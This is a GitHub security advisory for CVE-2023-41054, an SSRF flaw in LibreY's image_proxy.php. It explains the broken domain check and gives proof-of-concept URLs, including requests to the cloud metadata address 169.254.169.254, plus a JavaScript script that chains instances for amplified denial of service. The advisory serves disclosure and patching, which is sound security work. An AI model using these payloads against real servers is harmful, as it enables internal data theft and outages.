
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAhwxorg%2FLibreY%2Fsecurity%2Fadvisories%2FGHSA-p4f9-h8x8-mpwf)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAhwxorg%2FLibreY%2Fsecurity%2Fadvisories%2FGHSA-p4f9-h8x8-mpwf)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Ahwxorg%2FLibreY)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Ahwxorg](/Ahwxorg)
/
**[LibreY](/Ahwxorg/LibreY)**
Public

forked from [hnhx/librex](/hnhx/librex)

* [Notifications](/login?return_to=%2FAhwxorg%2FLibreY) You must be signed in to change notification settings
* [Fork
  26](/login?return_to=%2FAhwxorg%2FLibreY)
* [Star
   207](/login?return_to=%2FAhwxorg%2FLibreY)

* [Code](/Ahwxorg/LibreY)
* [Issues
  16](/Ahwxorg/LibreY/issues)
* [Pull requests
  0](/Ahwxorg/LibreY/pulls)
* [Discussions](/Ahwxorg/LibreY/discussions)
* [Actions](/Ahwxorg/LibreY/actions)
* [Projects
  0](/Ahwxorg/LibreY/projects)
* [Security](/Ahwxorg/LibreY/security)
* [Insights](/Ahwxorg/LibreY/pulse)

Additional navigation options

* [Code](/Ahwxorg/LibreY)
* [Issues](/Ahwxorg/LibreY/issues)
* [Pull requests](/Ahwxorg/LibreY/pulls)
* [Discussions](/Ahwxorg/LibreY/discussions)
* [Actions](/Ahwxorg/LibreY/actions)
* [Projects](/Ahwxorg/LibreY/projects)
* [Security](/Ahwxorg/LibreY/security)
* [Insights](/Ahwxorg/LibreY/pulse)

# LibreY Server-Side Request Forgery (SSRF) vulnerability in image\_proxy.php

High

[Ahwxorg](/Ahwxorg)
published
GHSA-p4f9-h8x8-mpwf
Sep 3, 2023

## Package

LibreX

## Affected versions

<= b5a9f12df91cb8ded541df291da58ce2f104fe62

## Patched versions

None

LibreY

< 8f9b9803f231e2954e5b49987a532d28fe50a627

>= 8f9b9803f231e2954e5b49987a532d28fe50a627

## Description

## Summary

Server-Side Request Forgery (SSRF) vulnerability in `image_proxy.php` in LibreY before commit [8f9b980](https://github.com/Ahwxorg/LibreY/commit/8f9b9803f231e2954e5b49987a532d28fe50a627) allows remote attackers to use the server as a proxy to send HTTP GET requests to arbitrary targets and retrieve information in the internal network or conduct Denial-of-Service (DoS) attacks via the `url` parameter.

## Details

In `image_proxy.php`, the requested root domain is checked to be in an array of allowed domains:

[LibreY/image\_proxy.php](https://github.com/Ahwxorg/LibreY/blob/3ae47a1cfc40cf231d1c413cf88415e5cdb386a5/image_proxy.php#L6-L18)

Lines 6 to 18
in
[3ae47a1](/Ahwxorg/LibreY/commit/3ae47a1cfc40cf231d1c413cf88415e5cdb386a5)

|  | $url = $\_REQUEST["url"]; |
| --- | --- |
|  | $requested\_root\_domain = get\_root\_domain($url); |
|  |  |
|  | $allowed\_domains = array("qwant.com", "wikimedia.org", get\_root\_domain($config->invidious\_instance\_for\_video\_results)); |
|  |  |
|  | if (in\_array($requested\_root\_domain, $allowed\_domains)) |
|  | { |
|  | $image = $url; |
|  | $image\_src = request($image); |
|  |  |
|  | header("Content-Type: image/png"); |
|  | echo $image\_src; |
|  | } |

But in `misc/tools.php`, the `get_root_domain` function malfunctioned:

[LibreY/misc/tools.php](https://github.com/Ahwxorg/LibreY/blob/3ae47a1cfc40cf231d1c413cf88415e5cdb386a5/misc/tools.php#L8-L16)

Lines 8 to 16
in
[3ae47a1](/Ahwxorg/LibreY/commit/3ae47a1cfc40cf231d1c413cf88415e5cdb386a5)

|  | function get\_root\_domain($url) { |
| --- | --- |
|  | $split\_url = explode("/", $url); |
|  | $base\_url = $split\_url[2]; |
|  |  |
|  | $base\_url\_main\_split = explode(".", strrev($base\_url)); |
|  | $root\_domain = strrev($base\_url\_main\_split[1]) . "." . strrev($base\_url\_main\_split[0]); |
|  |  |
|  | return $root\_domain; |
|  | } |

It uses the part after two slashes as the domain, but that is not always the case. The scheme could be omitted and HTTP will be used. `https:/` can also be used instead of `https://`. So a URL like `127.0.0.1:8000//qwant.com/../../path` or `https:/example.com/qwant.com/../` passes the check, and thus the request can target arbitrary URLs at the attacker's will.

The attacker can get the full response body of the GET request so confidential information could be disclosed.

The attacker can also conduct DoS attacks by requesting the server to download large files. If the server is behind a CDN, the original IP address can be disclosed via SSRF, so the DDoS protection provided by the CDN could be bypassed. It can be self-chained or chained among multiple server instances to amplify the DoS effect.

## PoC

### Retrieve sensitive information

Request `/image_proxy.php?url=example.com//qwant.com/../../` and see the response.

Or visit `/image_proxy.php?url=https:/samplelib.com/qwant.com/../lib/preview/png/sample-clouds2-400x300.png` in a browser, which is a PNG image that matches the content type header.

If the instance is hosted on a cloud provider that supports 169.254.169.254, request `/image_proxy.php?url=169.254.169.254//qwant.com/../../latest/` or `/image_proxy.php?url=169.254.169.254//qwant.com/../../opc/v1/instance/` and see the response.

### Denial-of-service (DoS)

Request `/image_proxy.php?url=https:/speed.hetzner.de/qwant.com/../10GB.bin` or `/image_proxy.php?url=speedtest.ftp.otenet.gr//qwant.com/../../files/test10Mb.db` multiple times, and then send normal requests to see long response time or errors.

### Chained DoS

JavaScript exploitation code:

```
const INSTANCES = [
  'https://librex.a.com/',
  'https://librex.b.com/',
  'https://librex.c.com/',
];
const FINAL_TARGET = 'http://speedtest.ftp.otenet.gr/files/test10Mb.db';
const NUMBER_OF_ROUNDS = 25;
const NUMBER_OF_REQUESTS = 1;

function manipulatedUrlParam(url) {
  const u = new URL(url);
  return `${u.protocol}/${u.host}/qwant.com/../${u.pathname}${u.search}`;
}

function imageProxyUrl(instance, target) {
  const u = new URL("image_proxy.php", instance);
  u.search = new URLSearchParams({ url: manipulatedUrlParam(target) });
  // u.search = `?url=${manipulatedUrlParam(target)}`;
  return u.toString();
}

let chainedUrl = FINAL_TARGET;
for (let i = 0; i < NUMBER_OF_ROUNDS; i += 1) {
  chainedUrl = imageProxyUrl(INSTANCES[i % INSTANCES.length], chainedUrl);
}
console.log(chainedUrl);

for (let i = 0; i < NUMBER_OF_REQUESTS; i += 1) {
  console.time(`fetch ${i}`);
  fetch(chainedUrl).then((res) => {
    console.timeEnd(`fetch ${i}`);
    console.log(`${res.status}: ${res.statusText}`);
    console.log(`Content-Type: ${res.headers.get('Content-Type')}`);
    // res.text().then((t) => console.log(`Body Length: ${t.length}`));
  });
}
```

A chained URL with 4 rounds between two instances looks like this: `https://librex.b.com/image_proxy.php?url=https%3A%2Flibrex.a.com%2Fqwant.com%2F..%2Fimage_proxy.php%3Furl%3Dhttps%253A%252Flibrex.b.com%252Fqwant.com%252F..%252Fimage_proxy.php%253Furl%253Dhttps%25253A%25252Flibrex.a.com%25252Fqwant.com%25252F..%25252Fimage_proxy.php%25253Furl%25253Dhttp%2525253A%2525252Fspeedtest.ftp.otenet.gr%2525252Fqwant.com%2525252F..%2525252Ffiles%2525252Ftest10Mb.db`

The number of rounds is limited by the maximum URI length. If the params are not URL-encoded, more rounds (up to ~130, depending on the length of the instance domain) would be possible but the exploitation code would be less robust. And when the DoS is successful, the chain will break in the middle so more rounds would not be useful for the attack.

In an experiment, this caused DoS for two of three chained instances for ~10 seconds in a single request. The actual effect depends on the server, but for stronger servers, it's still easy to DoS with slightly more frequent requests. Anyhow, the amplification by chaining is significant.

## Impact

Remote attackers can use the server as a proxy to send HTTP GET requests and retrieve information in the internal network. For example, the attacker may get AWS metadata at 169.254.169.254, or access services that are only locally available. However, only HTTP GET requests can be sent by the attacker, and redirects are not performed by the server.

Remote attackers can get the IP address of the server even if it is behind a CDN.

Remote attackers can also request the server to download large files or chain requests among multiple instances to reduce the performance of the server or even deny access from legitimate users.

## Patches

This has been fixed in [#31](https://github.com/Ahwxorg/LibreY/pull/31).

LibreY hosters are advised to use the latest commit, and LibreX hosters are advised to migrate to LibreY.

### Severity

High

8.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H

### CVE ID

CVE-2023-41054

### Weaknesses

[CWE-647](/advisories?query=cwe%3A647) [CWE-918](/advisories?query=cwe%3A918)

### Credits

* [![@ouuan](https://avatars.githubusercontent.com/u/30581822?s=40&v=4)](/ouuan)
  [ouuan](/ouuan)
  Finder
* [![@codedipper](https://avatars.githubusercontent.com/u/59625582?s=40&v=4)](/codedipper)
  [codedipper](/codedipper)
  Remediation developer
* [![@Ahwxorg](https://avatars.githubusercontent.com/u/87855602?s=40&v=4)](/Ahwxorg)
  [Ahwxorg](/Ahwxorg)
  Coordinator

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

